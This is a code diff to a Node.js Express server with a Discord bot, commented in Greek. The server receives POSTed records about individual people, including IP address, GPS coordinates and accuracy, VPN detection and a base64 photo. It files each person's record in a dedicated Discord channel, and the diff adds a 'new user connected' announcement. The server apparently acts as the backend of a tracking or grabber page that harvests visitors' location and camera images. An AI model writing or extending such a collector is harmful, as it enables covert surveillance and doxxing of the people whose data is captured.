@@ -14,13 +14,15 @@ const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers
     ]
 });
 
 const TOKEN = process.env.BOT_TOKEN;
 const SERVER_ID = process.env.SERVER_ID;
 const CATEGORY_ID = '1545817704127266876';
+const WELCOME_CHANNEL_ID = '1545861068117774349'; // Το κανάλι για τα welcomes
 
 const messageCache = new Map();
 
@@ -28,6 +30,7 @@ const messageCache = new Map();
 client.once('ready', () => {
     console.log(`✅ Bot online: ${client.user.tag}`);
     console.log(`📁 Κατηγορία ID: ${CATEGORY_ID}`);
+    console.log(`👋 Welcome Channel ID: ${WELCOME_CHANNEL_ID}`);
     
     const guild = client.guilds.cache.get(SERVER_ID);
     if (guild) {
@@ -36,6 +39,13 @@ client.once('ready', () => {
             console.log(`✅ Βρέθηκε η κατηγορία: ${category.name}`);
         } else {
             console.error(`❌ Δεν βρέθηκε κατηγορία με ID: ${CATEGORY_ID}`);
+        }
+        
+        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
+        if (welcomeChannel) {
+            console.log(`✅ Βρέθηκε το welcome κανάλι: #${welcomeChannel.name}`);
+        } else {
+            console.error(`❌ Δεν βρέθηκε welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
         }
     } else {
         console.error(`❌ Δεν βρέθηκε server με ID: ${SERVER_ID}`);
@@ -50,10 +60,27 @@ function cleanName(name) {
         .substring(0, 30);
 }
 
-function parseDataToEmbed(dataString, userName, photoBase64) {
-    // Δημιουργία embed
+function createWelcomeEmbed(userName, channelName) {
+    return new EmbedBuilder()
+        .setColor(0x00ff88)
+        .setTitle('👋 ΝΕΟΣ ΧΡΗΣΤΗΣ!')
+        .setDescription(`**${userName}** μόλις συνδέθηκε στο σύστημα!`)
+        .addFields(
+            { name: '📁 Κανάλι Χρήστη', value: `<#${channelName}>`, inline: true },
+            { name: '🕐 Χρόνος Σύνδεσης', value: new Date().toLocaleString('el-GR'), inline: true },
+            { name: '🔒 Κατάσταση', value: '✅ Επαληθεύτηκε', inline: true }
+        )
+        .setTimestamp()
+        .setFooter({ 
+            text: 'Secure Connection System • New User',
+            iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
+        })
+        .setThumbnail('https://cdn.discordapp.com/emojis/1085933512993218630.png');
+}
+
+function createDataEmbed(dataString, userName, photoBase64) {
     const embed = new EmbedBuilder()
-        .setColor(0x5865F2) // Discord blue
+        .setColor(0x5865F2)
         .setTitle('🔒 ΑΝΑΦΟΡΑ ΑΣΦΑΛΕΙΑΣ')
         .setDescription(`**Χρήστης:** ${userName || 'Άγνωστος'}`)
         .setTimestamp()
@@ -63,17 +90,14 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
         })
         .setThumbnail('https://cdn.discordapp.com/emojis/1085933512993218630.png');
 
-    // Αν υπάρχει φωτογραφία
     if (photoBase64 && photoBase64.startsWith('data:image/')) {
         embed.setImage('attachment://photo.jpg');
     }
 
-    // Καθαρισμός και διαχωρισμός γραμμών
     const lines = dataString.split('\n')
         .map(line => line.trim())
         .filter(line => line.length > 0);
 
-    // Ορισμός των πεδίων με τα emojis τους
     const fieldMap = {
         '👤': { name: '👤 Στοιχεία Χρήστη', icon: '👤' },
         '🌐': { name: '🌐 Διεύθυνση IP', icon: '🌐' },
@@ -90,7 +114,8 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
         '⏱️': { name: '⏱️ Χρόνος Σύνδεσης', icon: '⏱️' },
         '📍': { name: '📍 Συντεταγμένες GPS', icon: '📍' },
         '🎯': { name: '🎯 Ακρίβεια GPS', icon: '🎯' },
-        '📊': { name: '📊 Στατιστικά', icon: '📊' }
+        '📊': { name: '📊 Στατιστικά', icon: '📊' },
+        '🔒': { name: '🔒 VPN Detection', icon: '🔒' }
     };
 
     let currentField = null;
@@ -99,7 +124,6 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
     let generalInfo = [];
 
     for (const line of lines) {
-        // Έλεγχος αν η γραμμή ξεκινά με emoji πεδίου
         let matchedEmoji = null;
         for (const emoji of Object.keys(fieldMap)) {
             if (line.startsWith(emoji)) {
@@ -109,7 +133,6 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
         }
 
         if (matchedEmoji) {
-            // Αποθήκευση προηγούμενου πεδίου
             if (currentField && currentValue) {
                 fields.push({
                     name: currentField,
@@ -118,11 +141,9 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
                 });
             }
             
-            // Δημιουργία νέου πεδίου
             const parts = line.split(':').map(s => s.trim());
             if (parts.length >= 2) {
                 const value = parts.slice(1).join(':').trim();
-                // Αφαίρεση ** από την τιμή
                 const cleanValue = value.replace(/\*\*/g, '');
                 currentField = fieldMap[matchedEmoji].name;
                 currentValue = cleanValue;
@@ -131,17 +152,14 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
                 currentValue = line.replace(/\*\*/g, '');
             }
         } else {
-            // Συνέχιση τρέχοντος πεδίου
             if (currentField) {
                 currentValue += '\n' + line.replace(/\*\*/g, '');
             } else {
-                // Γενικές πληροφορίες
                 generalInfo.push(line.replace(/\*\*/g, ''));
             }
         }
     }
 
-    // Αποθήκευση τελευταίου πεδίου
     if (currentField && currentValue) {
         fields.push({
             name: currentField,
@@ -150,7 +168,6 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
         });
     }
 
-    // Αν υπάρχουν γενικές πληροφορίες, τις προσθέτουμε
     if (generalInfo.length > 0) {
         embed.addFields({
             name: '📋 Γενικές Πληροφορίες',
@@ -159,7 +176,6 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
         });
     }
 
-    // Προσθήκη πεδίων στο embed
     for (const field of fields) {
         let value = field.value;
         if (value.length > 1024) {
@@ -172,7 +188,6 @@ function parseDataToEmbed(dataString, userName, photoBase64) {
         });
     }
 
-    // Αν δεν υπάρχουν καθόλου πεδία, βάζουμε όλα σε description
     if (fields.length === 0 && generalInfo.length === 0) {
         embed.setDescription('```' + dataString.replace(/\*\*/g, '') + '```');
     }
@@ -189,6 +204,29 @@ async function clearChannelMessages(channel) {
         }
     } catch (error) {
         console.log('⚠️ Δεν μπόρεσα να διαγράψω όλα τα μηνύματα');
+    }
+}
+
+async function sendWelcomeMessage(userName, channelId) {
+    try {
+        const guild = client.guilds.cache.get(SERVER_ID);
+        if (!guild) {
+            console.error('❌ Δεν βρέθηκε ο server');
+            return;
+        }
+
+        const welcomeChannel = guild.channels.cache.get(WELCOME_CHANNEL_ID);
+        if (!welcomeChannel) {
+            console.error(`❌ Δεν βρέθηκε το welcome κανάλι με ID: ${WELCOME_CHANNEL_ID}`);
+            return;
+        }
+
+        const embed = createWelcomeEmbed(userName, channelId);
+        await welcomeChannel.send({ embeds: [embed] });
+        console.log(`👋 Στάλθηκε welcome για τον ${userName} στο #${welcomeChannel.name}`);
+
+    } catch (error) {
+        console.error('❌ Σφάλμα κατά την αποστολή welcome:', error);
     }
 }
 
@@ -218,7 +256,6 @@ app.post('/', async (req, res) => {
             return res.status(500).json({ success: false, error: 'Category not found' });
         }
         
-        // Δημιουργία ονόματος καναλιού
         const channelName = `👤-${cleanName(name)}`;
         console.log(`📝 Αναζήτηση/δημιουργία καναλιού: ${channelName}`);
         
@@ -227,6 +264,8 @@ app.post('/', async (req, res) => {
             c.name === channelName && 
             c.parentId === CATEGORY_ID
         );
+        
+        let isNewChannel = false;
         
         if (!channel) {
             console.log(`📝 Δημιουργία νέου καναλιού...`);
@@ -237,11 +276,16 @@ app.post('/', async (req, res) => {
                 reason: `Κανάλι για τον χρήστη ${name}`
             });
             console.log(`✅ Δημιουργήθηκε το κανάλι: ${channel.name}`);
+            isNewChannel = true;
         } else {
             console.log(`✅ Βρέθηκε υπάρχον κανάλι: ${channel.name}`);
         }
         
-        // Έλεγχος αν τα δεδομένα είναι ίδια
+        // ΣΤΟΛΗ WELCOME ΜΗΝΥΜΑΤΟΣ (μόνο αν είναι νέο κανάλι)
+        if (isNewChannel) {
+            await sendWelcomeMessage(name, channel.id);
+        }
+        
         const dataHash = Buffer.from(data + (photo || '')).toString('base64').substring(0, 50);
         const cacheKey = `${channel.id}_${name}`;
         
@@ -254,13 +298,10 @@ app.post('/', async (req, res) => {
             });
         }
         
-        // Διαγραφή παλιών μηνυμάτων
         await clearChannelMessages(channel);
         
-        // Δημιουργία embed
-        const embed = parseDataToEmbed(data, name, photo);
+        const embed = createDataEmbed(data, name, photo);
         
-        // Προετοιμασία αποστολής
         let messageOptions = { embeds: [embed] };
         
         if (photo && photo.startsWith('data:image/')) {
@@ -272,17 +313,16 @@ app.post('/', async (req, res) => {
             }];
         }
         
-        // Αποστολή
         await channel.send(messageOptions);
         console.log(`📤 ΕΠΙΤΥΧΙΑ! Στάλθηκε στο #${channel.name}`);
         
-        // Αποθήκευση hash
         messageCache.set(cacheKey, dataHash);
         
         res.json({ 
             success: true, 
             channel: channel.name,
-            message: 'Data sent successfully'
+            message: 'Data sent successfully',
+            isNewChannel: isNewChannel
         });
         
     } catch (error) {
@@ -294,13 +334,13 @@ app.post('/', async (req, res) => {
     }
 });
 
-// Health check
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
         bot: client.user?.tag || 'not ready',
         server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
-        category: CATEGORY_ID
+        category: CATEGORY_ID,
+        welcomeChannel: WELCOME_CHANNEL_ID
     });
 });
 
@@ -309,7 +349,8 @@ app.get('/test', (req, res) => {
         message: '✅ Το bot λειτουργεί!',
         bot: client.user?.tag || 'not ready',
         server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
-        category: CATEGORY_ID
+        category: CATEGORY_ID,
+        welcomeChannel: WELCOME_CHANNEL_ID
     });
 });
 
